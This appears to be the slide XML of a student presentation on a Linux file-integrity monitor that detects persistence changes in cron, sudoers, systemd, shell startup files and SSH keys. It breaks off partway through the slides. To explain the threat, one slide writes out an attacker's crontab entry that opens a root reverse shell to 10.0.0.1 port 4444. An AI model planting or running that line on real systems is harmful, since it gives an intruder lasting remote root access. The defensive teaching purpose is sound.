            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1150" u="sng">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Faculty Mentor: [Project Guide / Faculty Mentor Name]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Model Institute of Engineering &amp; Technology (MIET), Jammu  |  2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" altLang="en-US" sz="1150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>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404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5DFD5-DCAA-E5A0-62FF-4CC73C57671E}"/>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63F4158E-5F48-D6BF-1598-DA1C9B7672A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="249939"/>
            <a:ext cx="8153400" cy="738352"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Table of Contents</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="283C5F"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD38FBEE-3D6C-BF67-6B9A-F19489340349}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="533400" y="1589731"/>
            <a:ext cx="8153400" cy="5191658"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle/>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1. Introduction &amp; Background</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2. Problem Statement</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3. Project Objectives</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4. Linux Persistence: Core Concepts</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5. Proposed Solution (Scope &amp; Boundaries)</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6. System Architecture</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7. Key Technologies &amp; Tools</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8. Working Methodology &amp; Lifecycle</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9. Change Detection Demonstration (ADDED, MODIFIED, DELETED)</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10. SOC Cyber Dashboard &amp; Visual Telemetry</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11. Testing, Validation &amp; Experimental Results</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12. Critical Technical Limitations</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13. Future Scope &amp; Roadmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="461963" indent="-346075">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="tx1"/>
              </a:buClr>
              <a:buSzPct val="80000"/>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="140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rPr>
              <a:t>14. Conclusion &amp; Summary</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>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2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3766128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661445-721A-2C2A-9FFB-8325E66A243A}"/>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Introduction &amp; Background</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72DCE2B4-11FA-CBCA-C2EF-9FEDF6A419A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3093154"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Understanding Linux Persistence (MITRE ATT&amp;CK TA0003):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Persistence consists of techniques used by adversaries to keep access to systems across restarts, changed credentials, and other interruptions that would otherwise cut off their access.</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 The Critical Role of Linux Configuration Files:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Unlike Windows where persistence heavily relies on registry keys, Linux persistence predominantly resides in plain-text configuration files (/etc/crontab, /etc/sudoers, systemd unit files, shell startup scripts, and SSH authorized keys).</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 Stealthy Threat Vector:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Malicious persistence mechanisms masquerade as legitimate scheduled maintenance tasks or aliases, remaining dormant until triggered without opening persistent network connections.</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 The Role of Baseline Monitoring:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Establishing a cryptographically verified reference state enables automated detection of unexpected file alterations, unauthorized additions, and stealthy tampering before exploitation occurs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2122743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D4FD97-90EF-19A4-5B92-865351D7FC9B}"/>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Problem Statement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1DC0EAF-1A07-2BD2-8A8B-D77B8A55EC59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3493264"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Four critical security challenges addressed by this project:</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01  Stealthy Persistence in Plain-Text Configurations:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Adversaries plant backdoors inside legitimate system hooks (cron, sudoers, shell startup) that blend seamlessly into normal operating system files and escape routine antivirus scans.</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02  Limitations of Manual File Auditing:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Manually inspecting dozens of system-wide (/etc) and user-level (~/.ssh, ~/.bashrc) persistence locations across multi-user environments is slow, tedious, and highly error-prone.</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03  Need for Differential Clarity (Not Just Generic Alerts):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Security analysts need to see the exact lines added, modified, or removed rather than a vague timestamp alert to quickly distinguish benign administrative updates from malicious backdoors.</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04  Lack of Accessible, Transparent Prototypes for Education:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Commercial File Integrity Monitoring (FIM) tools are heavy, expensive, and opaque for academic study. A lightweight, zero-dependency prototype demonstrates core integrity principles clearly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2986697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E71827-556F-497B-544B-C8986E4A67C2}"/>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Project Objectives</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6E5F411-E4AF-6D51-1947-7418A54FF148}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3893374"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>01. Cryptographic Baseline Generation:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Implement automated scanning and SHA-256 cryptographic hashing of 23 target persistence vectors across system and user spaces, saving a signed, tamper-evident baseline snapshot.</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02. Automated Integrity Audit &amp; Detection Engine:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Build a differential change detector that categorizes filesystem state changes into ADDED, MODIFIED, and DELETED without external package dependencies.</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03. Textual Unified Line Diffing:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Generate precise, unified line diffs for modified text configuration files, highlighting exact injected lines for rapid analyst review.</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04. MITRE ATT&amp;CK Mapping &amp; Rule-Based Severity:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Map identified persistence vectors to official MITRE ATT&amp;CK technique IDs (e.g. T1053.003, T1548.001) and assign contextual severity ratings (CRITICAL, HIGH, MEDIUM, LOW).</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05. Local SOC Cyber Dashboard &amp; Verification:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    Deploy a standalone web interface on Python's built-in HTTP server with real-time metrics, diff modal inspection, and prominent DEMO environment labeling.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3668941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33D67A-5E91-4EB5-1EA3-FFFE88509817}"/>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Linux Persistence: Basic Concepts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4020F95D-1CCD-49DC-E422-0EF393FAF682}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3093154"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- What is Cron and /etc/crontab?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Cron is the standard Linux task scheduler daemon. The file /etc/crontab defines commands executed automatically as root at specified intervals (minute, hour, day, month, weekday).</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 Concrete Persistence Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  An attacker with temporary access appends a single scheduled line:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    0 3 * * * root /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  This executes a reverse shell daily at 3:00 AM, re-infecting the machine even after administrator reboots.</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 Other Primary Persistence Vectors Monitored by Sentinel:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Systemd Services (/etc/systemd/system/): persistent background daemons &amp; timer units.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Privilege Escalation (/etc/sudoers, /etc/sudoers.d/): granting passwordless root access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Dynamic Linker (/etc/ld.so.preload): hooking system library calls across all processes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Shell Startup Hooks (/etc/profile, ~/.bashrc): executing payload whenever users log in.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Remote Access (~/.ssh/authorized_keys): adding rogue public keys for persistent SSH login.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="562416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B5D3E9-18B5-D223-8523-A3E4AC37A0BB}"/>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Proposed Solution: Scope &amp; Boundaries</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8A3F9B1E-B27D-8D8A-A2A3-FCC51DD992D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="2693045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A. What Linux Persistence Change Sentinel DOES:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] Automates Scanning: Audits 23 system and user persistence targets on demand or periodically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] Cryptographic Integrity: Computes SHA-256 digests and captures POSIX permissions/metadata.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] Differential State Analysis: Categorizes changes into ADDED, MODIFIED, and DELETED.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] Line-by-Line Unified Diffing: Shows exact textual differences between baseline and current state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] Threat Intelligence Context: Maps changes to MITRE ATT&amp;CK techniques with severity ratings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [+] SOC Dashboard Visualizer: Provides responsive web UI with real-time metrics and diff modal.</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B. Critical Boundaries - What Sentinel DOES NOT Do:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [-] Does NOT claim changes are inherently malicious: Benign administrative edits are also flagged.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [-] Does NOT block, quarantine, or remediate files: It is an auditing and triage assistant, not an IPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [-] Does NOT monitor live Linux kernel calls: Tested safely on Windows via a mock Linux file tree.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  [-] Does NOT require administrator privileges: Designed for safe, unprivileged evaluation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3077662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6FDCD0-EC39-FC2C-F0F5-01F80A7ED71B}"/>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System Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD5D27D9-7AA1-CD9D-D7C8-C0116F7B8D6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2648" y="1143000"/>
            <a:ext cx="7924800" cy="5080000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3174935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5978DF-1F69-5E4F-D014-7DE940B3899C}"/>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Key Technologies &amp; Tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27CA546D-5AD0-CB69-6AA7-B985EAF82F68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3293209"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
